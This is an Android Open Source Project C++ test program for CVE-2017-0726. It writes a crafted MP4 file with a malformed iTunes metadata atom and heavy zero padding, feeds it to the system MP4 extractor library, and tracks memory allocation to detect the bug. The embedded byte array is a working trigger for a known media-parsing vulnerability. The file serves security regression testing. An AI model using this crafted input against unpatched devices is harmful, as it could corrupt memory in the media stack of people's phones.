/**
 * Copyright (C) 2020 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <dlfcn.h>
#include <media/IMediaHTTPService.h>
#include <media/DataSource.h>
#include <media/stagefright/DataSourceFactory.h>
#include <media/MediaExtractor.h>
#include <media/stagefright/MetaData.h>
#include <media/IMediaExtractor.h>
#include <media/DataSourceBase.h>
#include "../includes/memutils_track.h"
#include "../includes/common.h"

unsigned char mp4_data[] = { 0x00, 0x00, 0x00, 0x1C, 0x66, 0x74, 0x79, 0x70,
        0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00, 0x6D, 0x70, 0x34, 0x32,
        0x64, 0x62, 0x79, 0x31, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x00, 0x74,
        0x6D, 0x6F, 0x6F, 0x76, 0x00, 0x00, 0x00, 0x6C, 0x75, 0x64, 0x74, 0x61,
        0x00, 0x00, 0x00, 0x64, 0x6D, 0x65, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x58, 0x69, 0x6C, 0x73, 0x74, 0x00, 0x00, 0x00, 0x50,
        0x2D, 0x2D, 0x2D, 0x2D, 0x00, 0x00, 0x00, 0x1C, 0x6D, 0x65, 0x61, 0x6E,
        0x00, 0x00, 0x00, 0x00, 0x63, 0x6F, 0x6D, 0x2E, 0x61, 0x70, 0x70, 0x6C,
        0x65, 0x2E, 0x69, 0x54, 0x75, 0x6E, 0x65, 0x73, 0x00, 0x00, 0x00, 0x14,
        0x6E, 0x61, 0x6D, 0x65, 0x00, 0x00, 0x00, 0x00, 0x69, 0x54, 0x75, 0x6E,
        0x53, 0x4D, 0x50, 0x42, 0x00, 0x08, 0x00, 0x18, 0x64, 0x61, 0x74, 0x61,
        0x33, 0x32, 0x20, 0x34, 0x20, 0x33, 0x20, 0x32, 0x33, 0x32, 0x20, 0x34,
        0x20, 0x33, 0x20, 0x32 };

#define TOTAL_SIZE   524432
#define DATA_SIZE    144
#define TRACK_SIZE   (TOTAL_SIZE - DATA_SIZE + 16 + 1)
#define TMP_FILE     "/data/local/tmp/temp_cve_2017_0726"
#define LIB_NAME     "/system/lib64/extractors/libmp4extractor.so"

char enable_selective_overload = ENABLE_NONE;
using namespace android;

bool is_tracking_required(size_t size) {
    return (size == TRACK_SIZE);
}

int main() {

#if _64_BIT
    FILE* fp = fopen(TMP_FILE, "wb");
    if (!fp) {
        return EXIT_FAILURE;
    }

    char zero_array[TOTAL_SIZE - DATA_SIZE];
    memset(zero_array, 0, (TOTAL_SIZE - DATA_SIZE) * sizeof(char));

    /* Write mp4 stream */
    fwrite(mp4_data, 1, DATA_SIZE, fp);

    /* Append 0's to create custom PoC */
    fwrite(zero_array, 1, (TOTAL_SIZE - DATA_SIZE), fp);
    fclose(fp);

    void *libHandle = dlopen(LIB_NAME, RTLD_NOW | RTLD_LOCAL);
    if (!libHandle) {
        remove(TMP_FILE);
        return EXIT_FAILURE;
    }

    sp < DataSource > dataSource = DataSourceFactory::CreateFromURI(NULL,
    TMP_FILE);
    if (dataSource == nullptr) {
        remove(TMP_FILE);
        dlclose(libHandle);
        return EXIT_FAILURE;
    }

    MediaExtractor::GetExtractorDef getDef =
            (MediaExtractor::GetExtractorDef) dlsym(libHandle,
                                                    "GETEXTRACTORDEF");
    if (!getDef) {
        remove(TMP_FILE);
        dlclose(libHandle);
        return EXIT_FAILURE;
    }

    void *meta = nullptr;
    MediaExtractor::CreatorFunc creator = NULL;
    MediaExtractor::FreeMetaFunc freeMeta = nullptr;
    float confidence;
    creator = getDef().sniff(dataSource.get(), &confidence, &meta, &freeMeta);
    if (!creator) {
        remove(TMP_FILE);
        dlclose(libHandle);
        return EXIT_FAILURE;
    }

    MediaExtractor *ret = creator(dataSource.get(), meta);
    if (ret == nullptr) {
        remove(TMP_FILE);
        dlclose(libHandle);
        return EXIT_FAILURE;
    }

    if (meta != nullptr && freeMeta != nullptr) {
        freeMeta(meta);
    }

    sp < MetaData > metaData = new MetaData();
    enable_selective_overload = ENABLE_MALLOC_CHECK;
    ret->getTrackMetaData(*metaData.get(), 0, 1);
    enable_selective_overload = ENABLE_NONE;

    remove(TMP_FILE);
    dlclose(libHandle);
#endif /* _64_BIT */

    return EXIT_SUCCESS;
}
